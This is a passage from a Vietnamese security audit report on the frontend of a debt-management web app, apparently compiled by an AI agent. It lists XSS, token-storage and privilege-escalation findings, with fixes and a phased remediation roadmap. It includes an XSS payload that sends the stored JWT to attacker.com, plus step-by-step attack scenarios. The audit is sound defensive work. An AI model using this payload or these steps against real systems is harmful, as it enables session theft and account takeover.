  Nếu chuỗi này chứa các thẻ HTML độc hại hoặc sự kiện JavaScript (`<img src=x onerror=...`), trình duyệt sẽ thực thi mã độc ngay khi bảng thanh toán được render.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  1. Kẻ tấn công tạo giao dịch với tên khách hàng:
     `<img src=x onerror="fetch('https://attacker.com/steal?t='+localStorage.getItem('cactus_token'))">`.
  2. Nhân viên kế toán mở màn hình xem lịch sử giao dịch.
  3. Trình duyệt thực thi đoạn script, trích xuất token JWT trong `localStorage` và gửi về máy chủ của kẻ tấn công.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Tuyệt đối không sử dụng `innerHTML` với biến dữ liệu. Sử dụng `textContent` an toàn hoặc chuyển đổi hoàn toàn sang cơ chế render JSX tự động escape của React:
  ```javascript
  const tdDesc = document.createElement('td');
  tdDesc.className = 'py-3.5 px-4 text-slate-600';
  tdDesc.textContent = desc; // An toàn tuyệt đối, không parse HTML
  ```

---

#### SEC-FE-02: Lưu Trữ Thông Tin Xác Thực Nhạy Cảm (JWT Token & Identity) Trong `localStorage`
- **Định danh CWE / OWASP:** CWE-922 (Insecure Storage of Sensitive Information), OWASP A07:2021 & A01:2021.
- **Mức độ rủi ro:** **HIGH** (CVSS v3.1: 7.2 / AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Frontend/src/services/api.js`: Dòng 8–9, 64
  - `Frontend/src/context/DashboardContext.jsx`: Dòng 33–37, 74, 88, 103–104
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Hệ thống lưu trữ JWT token (`cactus_token`) và toàn bộ đối tượng định danh người dùng (`cactus_user`) trong trình duyệt thông qua Web Storage API (`localStorage.setItem(...)`). `localStorage` hoàn toàn không có cơ chế bảo vệ trước mã độc JavaScript: Bất kỳ lỗ hổng XSS nào trên cùng domain hoặc mã nguồn từ thư viện bên thứ 3 (third-party script) đều có thể đọc toàn bộ token mà không gặp bất kỳ rào cản nào.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  Kết hợp với lỗ hổng DOM XSS (SEC-FE-01), kẻ tấn công chèn mã khai thác đọc `localStorage.getItem('cactus_token')` và chiếm phiên làm việc vĩnh viễn trong 24 giờ.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Chuyển sang cơ chế lưu trữ JWT trong Cookie với các thuộc tính bảo vệ bắt buộc: `HttpOnly`, `Secure`, `SameSite=Strict`. Trình duyệt sẽ tự động đính kèm cookie trong các request API mà JavaScript không thể đọc được.

---

#### SEC-FE-03: Giao Diện Frontend Tự Động Cấp Quyền `ROLE_ADMIN` Khi Đăng Nhập Thất Bại
- **Định danh CWE / OWASP:** CWE-287 (Improper Authentication), CWE-602 (Client-Side Enforcement of Server-Side Security), OWASP A07:2021 (Identification and Authentication Failures).
- **Mức độ rủi ro:** **CRITICAL** (CVSS v3.1: 9.8 / AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Frontend/src/context/DashboardContext.jsx`: Dòng 90–97
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Trong hàm xử lý đăng nhập `loginUser` của `DashboardContext.jsx`:
  ```javascript
  // Frontend/src/context/DashboardContext.jsx:90-97
  } catch (e) {
    if (username === 'admin') {
      switchUserRole('ROLE_ADMIN');
      return { success: true };
    } else if (username === 'staff') {
      switchUserRole('ROLE_STAFF');
      return { success: true };
    }
    return { success: false, error: e.message };
  }
  ```
  Khi người dùng nhập sai mật khẩu của tài khoản `admin` hoặc khi Backend bị lỗi kết nối, khối `catch (e)` sẽ tự động phát hiện `username === 'admin'`, kích hoạt `switchUserRole('ROLE_ADMIN')` và trả về `{ success: true }`.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  1. Kẻ tấn công truy cập màn hình đăng nhập của ứng dụng web.
  2. Nhập username: `admin`, password: `sai_mat_khau_123`.
  3. Backend trả về HTTP 401 Unauthorized.
  4. Khối `catch` trên Frontend bắt được lỗi, tự động chuyển người dùng thành `ROLE_ADMIN`, mở khóa toàn bộ dashboard quản trị và bắt đầu gửi header `X-User-Role: ROLE_ADMIN` tới Backend.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Xóa bỏ hoàn toàn logic fallback giả lập này. Mọi trường hợp đăng nhập thất bại bắt buộc phải báo lỗi và chặn người dùng ở màn hình đăng nhập:
  ```javascript
  } catch (e) {
      return { success: false, error: e.message || 'Tên đăng nhập hoặc mật khẩu không chính xác.' };
  }
  ```

---

#### SEC-FE-04: Tự Do Nâng Quyền Quản Trị Hệ Thống Thông Qua Menu Chuyển Đổi Quyền Trên Thanh Topbar
- **Định danh CWE / OWASP:** CWE-602 (Client-Side Enforcement of Server-Side Security), OWASP A01:2021 (Broken Access Control).
- **Mức độ rủi ro:** **HIGH** (CVSS v3.1: 8.2 / AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Frontend/src/components/common/Topbar.jsx`: Dòng 308–360
  - `Frontend/src/context/DashboardContext.jsx`: Dòng 52–75
  - `Frontend/src/services/api.js`: Dòng 10–24
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Giao diện Frontend trên thanh Topbar cung cấp một menu thả xuống cho phép người dùng tự bấm chọn đổi vai trò (`switchUserRole('ROLE_ADMIN')`). Hành động này ghi đè đối tượng trong `localStorage`, sau đó tệp `api.js` đọc giá trị này và tự động gắn vào header `X-User-Role: ROLE_ADMIN` trong mọi request gửi tới máy chủ Backend.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  Khách hàng đăng nhập vào cổng tự phục vụ của con nợ, bấm vào menu Topbar chọn "Admin View", ngay lập tức giao diện hiển thị toàn bộ chức năng phê duyệt tín dụng và các lệnh API tiếp theo gửi kèm `X-User-Role: ROLE_ADMIN` được Backend chấp thuận.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Xóa bỏ toàn bộ dropdown chuyển quyền trên giao diện người dùng. Vai trò và quyền hạn hiển thị trên giao diện phải được giải mã duy nhất từ claims của JWT Token hợp lệ do máy chủ cấp.

---

## 4. LỘ TRÌNH KHẮC PHỤC & KHUYẾN NGHỊ CHIẾN LƯỢC (REMEDIATION ROADMAP)

Để đưa hệ thống DebtMaster trở lại trạng thái an toàn và tuân thủ các chuẩn mực tài chính, đội ngũ kỹ thuật cần triển khai kế hoạch xử lý phân kỳ nghiêm ngặt:

```
+-------------------------------------------------------------------------------------------------------+
|                                    LỘ TRÌNH KHẮC PHỤC 3 GIAI ĐOẠN                                     |
+-------------------------------------------------------------------------------------------------------+
| GIAI ĐOẠN 1: Vá Nóng Khẩn Cấp (24h - 48h)                                                             |
| [!] Thu hồi permitAll("/api/**") trong WebSecurityConfig -> Buộc xác thực toàn bộ API                  |
| [!] Xóa bỏ logic gán quyền 'admin' trong API đăng ký AuthController                                   |
| [!] Xóa bỏ cờ fallback tự động Admin khi login lỗi trong DashboardContext.jsx                         |
| [!] Loại bỏ hoàn toàn header X-User-Role & giá trị mặc định ROLE_ADMIN trong O2CWorkflowController   |
| [!] Chuyển JWT Secret và Database Password ra biến môi trường hệ thống                                |
+-------------------------------------------------------------------------------------------------------+
| GIAI ĐOẠN 2: Gia Cố Ngắn Hạn (1 - 2 Tuần)                                                             |
| [*] Bổ sung @PreAuthorize trên toàn bộ 9 Controller phụ trách tài chính và quản trị                    |
| [*] Tích hợp chữ ký HMAC-SHA256 cho Webhook thanh toán VietQR & Tài khoản ảo                          |
| [*] Thực thi nguyên tắc SoD (Maker != Checker) trong quy trình phê duyệt công nợ O2C                   |
| [*] Khử trùng ký tự công thức trong hàm xuất file CSV giao dịch                                       |
| [*] Áp dụng DTO Validation chặt chẽ (@Size, @DecimalMax, @DecimalMin)                                  |
| [*] Chuyển cơ chế lưu trữ JWT từ localStorage sang Cookie HttpOnly/Secure/SameSite                     |
+-------------------------------------------------------------------------------------------------------+
| GIAI ĐOẠN 3: Tái Cấu Trúc & Tự Động Hóa Dài Hạn (1 - 2 Tháng)                                          |
| [#] Triển khai kiến trúc Multi-Tenancy và kiểm soát BOLA/IDOR ở tầng Hibernate Repository Filter      |
| [#] Xây dựng bộ lọc Idempotency (Redis Token Bucket) & Khóa giao dịch phân tán tránh Race Condition   |
| [#] Cấu hình TLS/HTTPS bắt buộc và hoàn thiện bộ HTTP Security Headers (CSP, HSTS, X-Frame-Options)   |
| [#] Tích hợp OWASP Dependency-Check và kiểm tra SAST vào quy trình CI/CD Pipeline                     |
+-------------------------------------------------------------------------------------------------------+
```

### 4.1 Giai Đoạn 1: Vá Nóng Khẩn Cấp (Immediate Hotfixes - 24h đến 48h)
Các hành động bắt buộc phải thực hiện ngay lập tức để ngăn chặn nguy cơ xâm nhập và chiếm quyền hệ thống:
1. **Khóa Ngay Biên Giới Spring Security:** Thay đổi `WebSecurityConfig.java`, xóa bỏ quy tắc `permitAll()` đối với `/api/**`. Chỉ cho phép công khai duy nhất `/api/auth/login` và `/api/auth/register`.
2. **Loại Bỏ Leo Thang Quyền Trong Đăng Ký:** Sửa đổi `AuthController.java` để loại bỏ việc đọc mảng `roles` từ `RegisterRequest`, gán cứng duy nhất `ROLE_USER`.
3. **Triệt Tiêu Cơ Chế Ủy Quyền Client:** Xóa bỏ tham số `@RequestHeader("X-User-Role")` trong `O2CWorkflowController.java`. Xóa bỏ logic tự động đăng nhập Admin khi có lỗi trong `DashboardContext.jsx` và gỡ menu chuyển role trên Topbar.
4. **Bảo Mật Khóa Mật Mã:** Đổi ngay lập tức khóa bí mật JWT `jwt.secret` và mật khẩu CSDL `spring.datasource.password`, chuyển sang nạp từ biến môi trường của hệ điều hành.

### 4.2 Giai Đoạn 2: Gia Cố Ngắn Hạn (Short-Term Hardening - 1 đến 2 tuần)
1. **Phân Quyền Chi Tiết Mức Phương Thức:** Bổ sung `@PreAuthorize("hasRole('ADMIN')")` cho `AdminController`, `PayoutController`, và các phương thức giải phóng hạn mức công nợ.
2. **Bảo Mật Webhook Ngân Hàng:** Thiết kế lại endpoint callback của VietQR, kiểm tra chữ ký số HMAC-SHA256 và đối soát số tiền trước khi đánh dấu hóa đơn là `PAID`.
3. **Thiết Lập Rào Chắn SoD (Maker-Checker):** Thêm điều kiện nghiệp vụ kiểm tra `if (makerId.equals(checkerId)) throw new SecurityException(...)` trong mọi luồng phê duyệt xóa nợ hoặc điều chỉnh hạn mức.
4. **Khắc Phục Lỗ Hổng CSV Injection & DOM XSS:** Cập nhật hàm `escapeCsv()` trong `TransactionServiceImpl.java` để vô hiệu hóa các ký tự `=`, `+`, `-`, `@`. Thay thế toàn bộ `innerHTML` trong frontend bằng phương thức gán DOM an toàn.
5. **Rút Ngắn Tuổi Thọ Token:** Giảm thời gian sống của Access Token xuống 15 phút, triển khai Refresh Token Rotation trong cookie `HttpOnly`.

### 4.3 Giai Đoạn 3: Tái Cấu Trúc & Tự Động Hóa Dài Hạn (Medium-Term Architectural Improvements - 1 đến 2 tháng)
1. **Kiểm Soát Quyền Đối Tượng Tự Động (Multi-Tenancy Architecture):** Tích hợp Hibernate Filter hoặc Spring Data JPA Specification tự động gán điều kiện `organization_id = :currentOrgId` trên mọi câu lệnh `SELECT`, `UPDATE`, `DELETE`, triệt tiêu hoàn toàn nguy cơ BOLA/IDOR.
2. **Bộ Lọc Chống Tấn Công Lặp & Tranh Chấp Dữ Liệu (Idempotency Filter):** Xây dựng Filter kiểm tra header `Idempotency-Key` với Redis backend, kết hợp khóa bi quan `PESSIMISTIC_WRITE` trên CSDL để bảo vệ tuyệt đối tính nhất quán của số dư công nợ.
3. **Thiết Lập Bảo Mật Giao Vận & Trình Duyệt:** Triển khai chứng chỉ SSL/TLS (HTTPS) trên máy chủ web hoặc Reverse Proxy (Nginx/Traefik); áp dụng đầy đủ Content-Security-Policy (CSP), Strict-Transport-Security (HSTS), cấm hoàn toàn hiển thị trong iframe (`frame-ancestors 'none'`).
4. **Tự Động Hóa Kiểm Tra An Ninh Trong CI/CD:** Tích hợp các công cụ kiểm tra tự động (OWASP Dependency-Check, SonarQube, Snyk) vào pipeline phát triển phần mềm để phát hiện sớm các lỗ hổng mã nguồn và thư viện phụ thuộc trước khi triển khai.

---

**KẾT THÚC BÁO CÁO KIỂM TOÁN.**  
*Báo cáo được biên soạn độc lập bởi Chuyên gia Đánh giá An ninh & Báo cáo Kỹ thuật (teamwork_worker_report_1) dựa trên kết quả khảo sát chi tiết từ toàn bộ 3 nhóm kiểm toán mã nguồn.*
